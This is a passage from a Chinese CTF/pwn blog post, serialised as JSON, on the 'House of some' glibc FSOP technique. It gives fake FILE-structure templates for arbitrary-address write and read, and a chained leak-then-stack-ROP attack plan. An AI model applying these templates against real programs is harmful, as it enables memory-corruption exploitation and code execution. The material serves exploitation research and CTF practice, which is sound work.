0x18)</code>（注意此处不同）</li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(_wide_data + 0x30) = 0</code>（与apple2相同）</li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为任意一个包含<code>_IO_new_file_underflow</code>，其中原生的vtable就有，设置成<code>_IO_file_jumps-0x48</code>即可</li>\n<li><code>_vtable_offset</code>设置为<code>0</code></li>\n<li><code>_IO_buf_base</code>与<code>_IO_buf_end</code>设置为你需要写入的地址范围</li>\n<li><code>_chain</code>设置为你下一个触发的fake file地址</li>\n<li><code>_IO_write_ptr &lt;= _IO_write_base</code>即可</li>\n<li><code>_fileno</code>设置为<code>0</code>，表示<code>read(0, buf, size)</code></li>\n<li><code>_mode</code>设置为<code>2</code>，满足<code>fp-&gt;_mode &gt; 0</code>即可</li>\n</ul>\n<p>一个任意地址写的fake file模板如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_read = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: 任意地址写的起始地址, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: 任意地址写的终止地址, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0xc0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: wide_data的地址, <span class=\"comment\"># _wide_data</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_wfile_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide_data = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>: _IO_file_jumps - <span class=\"number\">0x48</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"构造任意地址读的fake-file\"><a href=\"#构造任意地址读的fake-file\" class=\"headerlink\" title=\"构造任意地址读的fake file\"></a>构造任意地址读的fake file</h2><p>这个就很简单了，以前也有这些研究，利用<code>_IO_write_base</code>和<code>_IO_write_ptr</code>实现任意地址读，这里给出构造模板，具体原理网上有很多教程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_write = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0x800</span> | <span class=\"number\">0x1000</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x20</span>: 需要泄露的起始地址, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: 需要泄露的终止地址, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">1</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_file_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"FSOP！\"><a href=\"#FSOP！\" class=\"headerlink\" title=\"FSOP！\"></a>FSOP！</h2><p>我们已经有了任意地址读、任意地址写的fake file构造，那么只需要将其用<code>_chain</code>串起来就可以达成强大的攻击效果</p>\n<p>那么我将House of some的攻击流程分成4步（RWRWR过程）（这也是一个广泛的思路，拥有任意地址写就不止一个方法了）</p>\n<ul>\n<li>第一步  任意地址写<code>_chain</code>，这里可以写<code>_IO_list_all</code>或者stdin、stdout、stderr的<code>_chain</code>位置，在这一步需要在可控地址上布置一个任意地址写的Fake file，之后将Fake file地址写入上述位置</li>\n<li>第二步 扩展fake file链条并泄露栈地址，在第一步的中，我们只有一个fake file，并不能完成更复杂的操作，所以这一步我们需要写入两个fake file，一个用于泄露<code>environ</code>内的值（即栈地址），另一个用于写入下一个fake file</li>\n<li>第三步 泄露栈内数据，并寻找ROP起始地址，这一步同样需要写入两个fake file，一个任意地址读，读取栈上内存，另一个任意地址写，向栈上写ROP</li>\n<li>第三步 写入ROP，实现栈上ROP攻击！</li>\n</ul>\n<p>下图是攻击的图示，黄色代表<code>_IO_flush_all</code>还未遍历的FILE，黑色代表已经处理过的FILE</p>\n<p><img src=\"/p/house-of-some/House-of-some.png\" alt=\"House of some\"></p>\n<h1 id=\"简单的分析\"><a href=\"#简单的分析\" class=\"headerlink\" title=\"简单的分析\"></a>简单的分析</h1><p>这个链条是基于House of apple2基础上衍生的，为什么需要apple2呢？因为，在意外调用vtable的过程中，需要给vtable项加上偏移，但是<code>_IO_SYSREAD</code>等宏也是通过偏移索引，所以会导致偏移出错无法按照预定逻辑，那么就想到wide data内的vtable，修改此处的偏移可以不影响IO FILE的vtable。</p>\n<p>这个利用链条从源码中分析得出，不依赖二进制编译结果，以及可以无视加上wide data内的vtable的检查，这就导致了非常强大的泛用性。</p>\n<p>同时House of some带回了原生的FSOP流程（RWRWR过程），我们重新回到了起点——angelboy提出的FSOP原来的样子，利用chain把一个一个fake file串起来，通过多次的fake file调用<code>_IO_OVERFLOW</code>，实现二次泄露甚至多次泄露，使得我们游走在任意地址中，修改任意的地址内容！</p>\n<p>为何选择栈上ROP，因为这是最简单最有效最暴力的攻击方法，可以无需栈迁移，无视canary（任意读可以泄露，甚至我能控制写入起点，可以选择canary后面作为起点），最后栈溢出永不过时！</p>\n","path":"/p/house-of-some/","permalink":"https://blog.csome.cc/p/house-of-some/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"House","_id":"cuidBfThP-0OG38VMrLPRzbXy","slug":"House","path":"tags/House/","permalink":"https://blog.csome.cc/tags/House/","length":3}],"categories":[],"prev":{"title":"[Black Hat 2023] Pwn Houseofminho Csome writeup","date":"2023-11-18T03:37:18.000Z","slug":"houseofminho-wp","published":true,"updated":"2025-10-28T08:00:40.775Z","_id":"cuidMWkmSaBiKpzOhHxpZU9uy","layout":"post","photos":[],"excerpt":"","path":"/p/houseofminho-wp/","permalink":"https://blog.csome.cc/p/houseofminho-wp/","__post":true},"next":{"title":"[2023NepCTF] Csome Writeup","date":"2023-08-15T08:11:37.000Z","slug":"2023NepCTF","published":true,"updated":"2025-10-28T08:00:40.743Z","_id":"cuidC-n_8JBGdGBSSVnvfsumM","layout":"post","photos":[],"excerpt":"","path":"/p/2023NepCTF/","permalink":"https://blog.csome.cc/p/2023NepCTF/","__post":true},"__post":true}